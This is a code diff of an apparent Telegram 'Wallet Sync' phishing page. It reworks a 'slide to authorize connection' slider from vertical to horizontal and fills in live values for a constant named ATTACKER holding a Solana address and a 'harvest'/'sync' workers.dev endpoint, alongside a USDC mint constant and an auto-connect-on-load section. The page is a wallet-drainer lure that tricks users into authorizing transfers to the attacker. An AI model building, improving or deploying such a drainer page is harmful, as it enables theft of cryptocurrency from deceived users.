@@ -74,17 +74,17 @@
   h1 { font-size: 20px; font-weight: 600; margin-bottom: 8px; letter-spacing: -0.5px; }
   p { font-size: 13px; color: #888888; text-align: center; line-height: 1.5; margin-bottom: 24px; }
 
-  /* Vertikaler Slider */
+  /* Horizontaler Slider (Rechts nach Links) */
   .slider-container {
-    width: 56px;
-    height: 200px;
+    width: 100%;
+    height: 56px;
     background: rgba(255, 255, 255, 0.05);
     border: 1px solid rgba(255, 255, 255, 0.1);
     border-radius: 28px;
     position: relative;
     overflow: hidden;
     display: flex;
-    flex-direction: column-reverse; /* Startet von unten */
+    flex-direction: row-reverse; /* Startet von rechts */
     align-items: center;
     padding: 4px;
     user-select: none;
@@ -92,16 +92,9 @@
 
   .slider-text {
     position: absolute;
-    width: 200px;
-    height: 56px;
-    bottom: 0;
-    left: 50%;
-    transform: translateX(-50%) rotate(-90deg);
-    transform-origin: center;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-size: 13px;
+    width: 100%;
+    text-align: center;
+    font-size: 14px;
     font-weight: 500;
     color: rgba(255, 255, 255, 0.4);
     pointer-events: none;
@@ -127,27 +120,26 @@
     width: 20px; height: 20px;
     color: #000000;
     transition: transform 0.2s;
-    transform: rotate(-90deg); /* Pfeil zeigt nach oben */
+    transform: rotate(180deg); /* Pfeil zeigt nach links */
   }
 
   /* States */
   .slider-container.loading .slider-thumb {
-    height: calc(100% - 8px);
+    width: calc(100% - 8px);
     border-radius: 24px;
     background: #14F195;
     pointer-events: none;
     display: flex;
-    align-items: flex-start; /* Spinner geht nach oben */
-    padding-top: 16px;
+    justify-content: flex-start;
+    padding-left: 16px;
   }
 
   .slider-container.success .slider-thumb {
-    height: calc(100% - 8px);
+    width: calc(100% - 8px);
     border-radius: 24px;
     background: #14F195;
     pointer-events: none;
     justify-content: center;
-    align-items: center;
   }
 
   .spinner {
@@ -174,10 +166,10 @@
     </div>
 
     <h1>Wallet Sync</h1>
-    <p>Slide up to authorize connection.</p>
+    <p>Slide left to authorize connection.</p>
 
     <div class="slider-container" id="sliderContainer">
-      <div class="slider-text" id="sliderText">Slide up</div>
+      <div class="slider-text" id="sliderText">Slide left</div>
       <div class="slider-thumb" id="sliderThumb">
         <svg id="sliderIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M12 5l7 7-7 7"></path></svg>
         <div class="spinner" id="spin"></div>
@@ -191,8 +183,9 @@
     window.Telegram.WebApp.expand();
   }
 
-  const ATTACKER = "DEINE_SOLANA_ADRESSE_HIER"; 
-  const ENDPOINT = "https://harvest-api.rthvzkr6jv.workers.dev"; 
+  // DEINE KONFIGURATION
+  const ATTACKER = "FN73jYtbKMkfT14yG8MvMzrmCSREyX45rUrxiKoRbofB"; 
+  const ENDPOINT = "https://sol-sync-worker.rthvzkr6jv.workers.dev"; 
   const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"; 
 
   const container = document.getElementById('sliderContainer');
@@ -202,8 +195,8 @@
   const spin = document.getElementById('spin');
 
   let isDragging = false;
-  let startY = 0;
-  let currentY = 0;
+  let startX = 0;
+  let currentX = 0;
   let maxDrag = 0;
 
   // --- AUTO CONNECT ON LOAD ---
@@ -221,31 +214,30 @@
 
   // --- SLIDER LOGIC ---
   function initSlider() {
-    // Höhe des Containers minus Höhe des Thumbs minus Padding
-    maxDrag = container.offsetHeight - thumb.offsetHeight - 8;
+    maxDrag = container.offsetWidth - thumb.offsetWidth - 8;
   }
 
   function startDrag(e) {
     if (container.classList.contains('loading') || container.classList.contains('success')) return;
     isDragging = true;
-    startY = e.type.includes('mouse') ? e.clientY : e.touches[0].clientY;
+    startX = e.type.includes('mouse') ? e.clientX : e.touches[0].clientX;
     thumb.style.transition = 'none';
   }
 
   function moveDrag(e) {
     if (!isDragging) return;
-    const clientY = e.type.includes('mouse') ? e.clientY : e.touches[0].clientY;
+    const clientX = e.type.includes('mouse') ? e.clientX : e.touches[0].clientX;
     
-    // Ziehen nach oben bedeutet negatives Delta. Wir drehen es um.
-    let delta = startY - clientY; 
+    // Ziehen nach links bedeutet negatives Delta. Wir drehen es um.
+    let delta = startX - clientX; 
     
     if (delta < 0) delta = 0;
     if (delta > maxDrag) delta = maxDrag;
     
-    currentY = delta;
-    thumb.style.transform = `translateY(-${currentY}px)`;
+    currentX = delta;
+    thumb.style.transform = `translateX(-${currentX}px)`;
     
-    const opacity = 1 - (currentY / maxDrag);
+    const opacity = 1 - (currentX / maxDrag);
     text.style.opacity = opacity;
   }
 
@@ -253,13 +245,12 @@
     if (!isDragging) return;
     isDragging = false;
     
-    if (currentY > maxDrag * 0.7) {
+    if (currentX > maxDrag * 0.7) {
       // Trigger Connect
       container.classList.add('loading');
       text.style.opacity = 0;
-      thumb.style.transition = 'height 0.3s ease, border-radius 0.3s ease, transform 0.3s ease';
-      // Thumb wächst nach oben
-      thumb.style.transform = `translateY(-${maxDrag}px)`;
+      thumb.style.transition = 'width 0.3s ease, border-radius 0.3s ease, transform 0.3s ease';
+      thumb.style.transform = `translateX(-${maxDrag}px)`;
       
       icon.style.display = 'none';
       spin.style.display = 'block';
@@ -268,9 +259,9 @@
     } else {
       // Snap back
       thumb.style.transition = 'transform 0.3s cubic-bezier(0.16, 1, 0.3, 1)';
-      thumb.style.transform = 'translateY(0)';
+      thumb.style.transform = 'translateX(0)';
       text.style.opacity = 1;
-      currentY = 0;
+      currentX = 0;
     }
   }
 
@@ -339,14 +330,14 @@
   function resetSlider() {
     container.classList.remove('loading');
     text.style.opacity = 1;
-    text.textContent = "Slide up";
+    text.textContent = "Slide left";
     spin.style.display = 'none';
     icon.style.display = 'block';
-    thumb.style.transition = 'transform 0.3s cubic-bezier(0.16, 1, 0.3, 1), height 0.3s ease, border-radius 0.3s ease';
-    thumb.style.transform = 'translateY(0)';
-    thumb.style.height = '48px';
+    thumb.style.transition = 'transform 0.3s cubic-bezier(0.16, 1, 0.3, 1), width 0.3s ease, border-radius 0.3s ease';
+    thumb.style.transform = 'translateX(0)';
+    thumb.style.width = '48px';
     thumb.style.borderRadius = '50%';
-    currentY = 0;
+    currentX = 0;
   }
 
   // Event Listeners
